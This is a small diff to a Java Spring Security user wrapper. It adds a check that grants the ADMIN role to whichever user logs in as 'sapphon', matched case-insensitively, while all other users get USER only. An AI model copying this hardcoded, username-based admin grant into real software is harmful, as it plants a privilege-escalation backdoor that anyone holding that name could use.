@@ -16,6 +16,9 @@ public class UserDetailsUserWrapper implements UserDetails {
     }
         @Override
         public Collection<? extends GrantedAuthority> getAuthorities() {
+        if(user.getLoginUsername().equalsIgnoreCase("sapphon")){
+            return newArrayList(new SimpleGrantedAuthority("USER"), new SimpleGrantedAuthority("ADMIN"));
+        }
             return newArrayList(new SimpleGrantedAuthority("USER"));
         }
 
